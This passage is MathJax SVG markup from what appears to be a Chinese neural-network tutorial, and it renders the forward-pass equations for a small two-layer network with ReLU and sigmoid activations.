3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mi" transform="translate(4561.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5355.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(6355.6,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mstyle" transform="translate(7614.3,0)"><g data-mml-node="mspace"/><g data-mml-node="mo" transform="translate(8614.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9003.3,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9725.5,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10725.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11225.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mi>x</mi><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><mo stretchy="false">(</mo><mn>3</mn><mo>Ã—</mo><mn>2</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.561ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 7320 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1636.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(2692.3,0)"><path data-c="52" d="M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z" style="stroke-width: 3;"/><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(736,0)" style="stroke-width: 3;"/><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" transform="translate(1180,0)" style="stroke-width: 3;"/><path data-c="55" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q57 680 180 680Q315 680 324 683H335V637H302Q262 636 251 634T233 622L232 418V291Q232 189 240 145T280 67Q325 24 389 24Q454 24 506 64T571 183Q575 206 575 410V598Q569 608 565 613T541 627T489 637H472V683H481Q496 680 598 680T715 683H724V637H707Q634 633 622 598L621 399Q620 194 617 180Q617 179 615 171Q595 83 531 31T389 -22Q304 -22 226 33T130 192Q129 201 128 412V622Z" transform="translate(1805,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5247.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(5636.3,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6931,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mtext>ReLU</mtext><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li><li><p>è®¡ç®—è¾“å‡ºå±‚ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="28.058ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 12401.5 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1572.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2628.3,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4561.2,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6142.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7142.3,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mstyle" transform="translate(8401,0)"><g data-mml-node="mspace"/><g data-mml-node="mo" transform="translate(9401,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9790,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10512.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(11512.5,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(12012.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><mo stretchy="false">(</mo><mn>1</mn><mo>Ã—</mo><mn>3</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.107ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 4467.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1823.6,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2394.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2783.6,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 